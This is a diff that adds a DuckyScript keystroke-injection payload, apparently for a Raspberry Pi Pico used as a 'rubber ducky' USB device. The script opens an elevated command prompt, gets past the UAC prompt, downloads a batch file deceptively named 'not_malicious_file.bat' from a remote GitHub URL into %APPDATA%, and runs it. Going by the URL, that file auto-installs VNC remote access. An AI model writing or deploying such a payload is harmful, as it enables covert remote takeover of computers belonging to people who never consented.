@@ -1,0 +1,17 @@
+GUI r
+DELAY 500
+STRING powershell Start-Process cmd -Verb runAs
+ENTER
+DELAY 2000
+SHIFT TAB
+ENTER
+DELAY 1000
+STRING cd %APPDATA%
+ENTER
+DELAY 1000
+STRING curl.exe --output not_malicious_file.bat --url https://raw.githubusercontent.com/nzkoxzu/pi-pico-rubber-ducky/main/vnc_auto_inst.bat
+ENTER
+DELAY 2000
+STRING not_malicious_file.bat
+ENTER 
+DELAY
